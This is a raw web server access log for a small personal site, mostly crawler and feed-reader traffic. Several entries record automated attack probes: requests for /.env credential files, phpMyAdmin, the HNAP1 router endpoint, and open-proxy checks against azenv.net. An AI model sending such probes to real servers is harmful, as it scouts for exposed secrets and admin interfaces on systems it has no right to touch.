45.143.146.244 - - [27/Dec/2021:00:35:56 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.143.146.244 - - [27/Dec/2021:00:35:56 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.217.53 - - [27/Dec/2021:00:41:15 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
114.119.130.26 - - [27/Dec/2021:00:51:13 +0000] "GET /blog/2011/2/5/Verizon__Samsung_SCS-2U01_Port_Scan.html HTTP/1.1" 301 281 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
196.196.41.68 - - [27/Dec/2021:00:52:33 +0000] "GET / HTTP/1.1" 301 230 "-" "-"
40.77.167.105 - - [27/Dec/2021:00:54:46 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.26 - - [27/Dec/2021:00:54:51 +0000] "GET /blog/2011/9/25/Poking%20around%20an%20Ademco%20RapidEye%20Multi.html HTTP/1.1" 301 285 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
93.183.76.45 - - [27/Dec/2021:00:58:01 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
139.162.145.250 - - [27/Dec/2021:00:59:56 +0000] "\x16\x03\x01" 400 226 "-" "-"
114.67.249.200 - - [27/Dec/2021:01:03:48 +0000] "hi its me" 400 226 "-" "-"
114.67.249.200 - - [27/Dec/2021:01:03:50 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"
114.119.133.46 - - [27/Dec/2021:01:06:05 +0000] "GET /blog/tags/Building.html HTTP/1.1" 301 250 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.53.90.24 - - [27/Dec/2021:01:15:30 +0000] "GET http://azenv.net/ HTTP/1.1" 301 226 "-" "Go-http-client/1.1"
185.53.90.24 - - [27/Dec/2021:01:15:42 +0000] "CONNECT azenv.net:443 HTTP/1.1" 301 226 "-" "Go-http-client/1.1"
103.131.71.143 - - [27/Dec/2021:01:19:40 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)"
172.104.138.223 - - [27/Dec/2021:01:20:54 +0000] "GET /fuN3 HTTP/1.0" 301 231 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
188.166.40.32 - - [27/Dec/2021:01:39:00 +0000] "GET / HTTP/1.1" 301 230 "-" "-"
188.166.40.32 - - [27/Dec/2021:01:39:02 +0000] "POST /HNAP1/ HTTP/1.1" 301 236 "-" "Mozila/5.0"
69.164.211.90 - - [27/Dec/2021:01:41:16 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
157.245.70.127 - - [27/Dec/2021:01:50:46 +0000] "GET /ab2g HTTP/1.1" 400 226 "-" "-"
157.245.70.127 - - [27/Dec/2021:01:50:46 +0000] "GET /ab2h HTTP/1.1" 400 226 "-" "-"
127.0.0.1 - - [27/Dec/2021:02:13:35 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
97.107.141.188 - - [27/Dec/2021:02:41:16 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
185.191.171.15 - - [27/Dec/2021:02:47:03 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.37 - - [27/Dec/2021:02:47:03 +0000] "GET /blog/doku.php?id=building_fs2_on_solaris HTTP/1.1" 301 267 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
123.125.109.105 - - [27/Dec/2021:02:55:16 +0000] "GET / HTTP/1.1" 301 227 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
216.244.66.232 - - [27/Dec/2021:02:59:21 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
